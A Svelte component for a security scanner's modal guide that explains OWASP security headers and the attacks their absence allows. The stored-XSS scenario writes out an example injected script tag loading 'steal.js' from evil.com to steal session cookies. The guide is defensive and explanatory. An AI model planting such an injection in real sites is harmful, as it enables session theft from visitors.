<script lang="ts">
    import * as m from '$lib/paraglide/messages';
    import { X, ShieldCheck, AlertTriangle, ArrowRight, ChevronRight, ChevronLeft } from 'lucide-svelte';
    import { fade, fly } from 'svelte/transition';
    import { backOut } from 'svelte/easing';

    let { isOpen = $bindable(false) } = $props<{ isOpen: boolean }>();
    function close() { isOpen = false; }

    let activeTab = $state(0);
    const tabs = [
        { id: 0, label: '1. OWASP Headers', icon: ShieldCheck },
        { id: 1, label: '2. Attack Vectors', icon: AlertTriangle },
    ];
    function nextTab() { if (activeTab < tabs.length - 1) activeTab++; }
    function prevTab() { if (activeTab > 0) activeTab--; }

    const headers = [
        { name: 'Strict-Transport-Security', short: 'HSTS', risk: 'MitM / SSL stripping', desc: 'Forces browsers to use HTTPS exclusively. Without it, attackers can intercept HTTP→HTTPS redirects.' },
        { name: 'X-Frame-Options', short: 'XFO', risk: 'Clickjacking', desc: 'Prevents the page from being embedded in iframes, blocking UI redressing attacks that trick users into clicking hidden actions.' },
        { name: 'X-Content-Type-Options', short: 'XCTO', risk: 'MIME sniffing', desc: 'Stops browsers from interpreting files as a different MIME type. Prevents serving a JS payload as an image file.' },
        { name: 'X-XSS-Protection', short: 'XSS', risk: 'Reflected XSS', desc: 'Legacy header that activates browser XSS auditor. Largely superseded by CSP but still blocks some reflected attacks in older browsers.' },
        { name: 'Content-Security-Policy', short: 'CSP', risk: 'XSS / Data injection', desc: 'The most powerful header. Defines trusted script/style sources — a strict CSP can completely neutralize stored and reflected XSS.' },
    ];
</script>

{#if isOpen}
    <!-- svelte-ignore a11y_click_events_have_key_events, a11y_no_static_element_interactions -->
    <div class="fixed inset-0 z-[60] flex items-center justify-center p-4 sm:p-6 bg-overlay backdrop-blur-md"
        transition:fade={{ duration: 200 }} onclick={close}>
        <div class="bg-[#0A0C10] border border-cyan-500/20 rounded-2xl w-full max-w-3xl overflow-hidden shadow-[0_0_50px_-12px_rgba(6,182,212,0.15)] relative flex flex-col max-h-[90vh]"
            transition:fly={{ y: 20, duration: 400, easing: backOut }} onclick={(e) => e.stopPropagation()}>

            <div class="relative bg-gradient-to-r from-cyan-950/40 via-blue-900/10 to-transparent p-6 border-b border-cyan-500/10 shrink-0">
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-cyan-500/10 blur-[64px] rounded-full pointer-events-none"></div>
                <button onclick={close} class="absolute top-4 right-4 p-2 text-muted hover:text-primary-text bg-glass hover:bg-cyan-500/20 rounded-xl transition-all border border-subtle hover:border-cyan-500/30" aria-label="Close"><X size={18}/></button>
                <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 relative z-10">
                    <div class="flex items-center gap-4">
                        <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-500/20 to-blue-600/10 flex items-center justify-center border border-cyan-500/30">
                            <ShieldCheck size={28} class="text-accent"/>
                        </div>
                        <div>
                            <h2 class="text-2xl font-bold tracking-tight text-primary-text">{m.guide_security_headers_title()}</h2>
                            <p class="text-sm text-muted mt-1">{m.guide_security_headers_subtitle()}</p>
                        </div>
                    </div>
                    <div class="flex bg-glass p-1 rounded-lg border border-subtle mt-4 sm:mt-0">
                        {#each tabs as tab (tab.id)}
                            <button onclick={() => activeTab = tab.id}
                                class="flex items-center gap-2 px-3 py-1.5 rounded-md text-sm font-medium transition-all {activeTab === tab.id ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/20' : 'text-muted hover:text-primary-text hover:bg-glass border border-transparent'}">
                                <tab.icon size={14}/><span class="hidden sm:inline">{tab.label}</span>
                            </button>
                        {/each}
                    </div>
                </div>
            </div>

            <div class="flex-1 overflow-y-auto p-6">
                {#if activeTab === 0}
                    <div transition:fade={{ duration: 200 }}>
                        <h3 class="text-lg font-semibold text-cyan-300 mb-4">OWASP Security Header Checklist</h3>
                        <p class="text-sm text-muted mb-5">These five HTTP response headers form the baseline hardening layer recommended by OWASP. WebQ checks each one on the live target and scores your posture accordingly.</p>
                        <div class="space-y-3">
                            {#each headers as h}
                                <div class="bg-sunken border border-base rounded-xl p-4">
                                    <div class="flex items-start justify-between gap-3 mb-2">
                                        <div>
                                            <p class="font-mono text-sm text-cyan-300 font-bold">{h.name}</p>
                                            <p class="text-xs text-muted mt-0.5">Blocks: <span class="text-red-400">{h.risk}</span></p>
                                        </div>
                                        <span class="text-xs bg-cyan-500/10 text-accent border border-cyan-500/20 px-2 py-1 rounded font-mono shrink-0">{h.short}</span>
                                    </div>
                                    <p class="text-xs text-muted leading-relaxed">{h.desc}</p>
                                </div>
                            {/each}
                        </div>
                    </div>
                {:else if activeTab === 1}
                    <div transition:fade={{ duration: 200 }}>
                        <h3 class="text-lg font-semibold text-rose-400 mb-4">Attack Scenarios Without These Headers</h3>
                        <div class="space-y-4">
                            <div class="bg-red-950/10 border border-red-500/20 rounded-xl p-5">
                                <h4 class="text-sm font-bold text-red-400 mb-2">No CSP → Stored XSS Full Takeover</h4>
                                <p class="text-xs text-muted leading-relaxed">Attacker injects <code class="text-rose-300">&lt;script src="https://evil.com/steal.js"&gt;</code> into a comment. Without CSP, the browser executes it — stealing session cookies, redirecting users, or mining crypto in every visitor's browser.</p>
                            </div>
                            <div class="bg-orange-950/10 border border-orange-500/20 rounded-xl p-5">
                                <h4 class="text-sm font-bold text-orange-400 mb-2">No XFO → Clickjacking Admin Actions</h4>
                                <p class="text-xs text-muted leading-relaxed">Attacker iframes your site inside their page. They overlay invisible buttons on top of visible elements. A user thinks they're clicking "Continue" but they're clicking "Delete Account" or "Approve Transfer".</p>
                            </div>
                            <div class="bg-yellow-950/10 border border-yellow-500/20 rounded-xl p-5">
                                <h4 class="text-sm font-bold text-yellow-400 mb-2">No HSTS → SSL Stripping</h4>
                                <p class="text-xs text-muted leading-relaxed">On a shared network (café WiFi), attacker intercepts the initial HTTP request before the 301 redirect to HTTPS. They downgrade the connection to plain HTTP and read all traffic in clear text.</p>
                            </div>
                            <div class="bg-emerald-950/10 border border-emerald-500/20 rounded-xl p-5 flex gap-3">
                                <div class="bg-emerald-500/10 p-2 rounded-lg h-fit"><ShieldCheck size={18} class="text-emerald-400"/></div>
                                <div>
                                    <h4 class="text-sm font-bold text-emerald-300 mb-1">Score Meaning</h4>
                                    <p class="text-xs text-muted">WebQ computes a composite score (0–100) weighing headers, HTTPS availability, redirect enforcement, and SSL health. A score below 50 indicates critical exposure. Above 80 is considered well-hardened.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                {/if}
            </div>

            <div class="bg-[#0A0C10] p-4 border-t border-cyan-500/10 flex items-center justify-between shrink-0">
                <div class="text-xs text-muted hidden sm:block">Press <kbd class="px-2 py-1 bg-glass rounded mx-1 border border-glass font-mono">Esc</kbd> or click outside to dismiss</div>
                <div class="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-end">
                    {#if activeTab > 0}
                        <button onclick={prevTab} class="flex items-center gap-1.5 px-5 py-2.5 bg-glass hover:bg-glass-hover text-primary-text text-sm font-medium rounded-xl border border-subtle transition-all"><ChevronLeft size={16}/> Previous</button>
                    {:else}<div></div>{/if}
                    {#if activeTab < tabs.length - 1}
                        <button onclick={nextTab} class="flex items-center gap-1.5 px-6 py-2.5 bg-cyan-600 hover:bg-cyan-500 text-primary-text text-sm font-semibold rounded-xl shadow-[0_0_20px_rgba(6,182,212,0.4)] transition-all">Continue <ChevronRight size={16}/></button>
                    {:else}
                        <button onclick={close} class="flex items-center gap-1.5 px-8 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-emerald-950 text-sm font-bold rounded-xl transition-all">Got it</button>
                    {/if}
                </div>
            </div>
        </div>
    </div>
{/if}
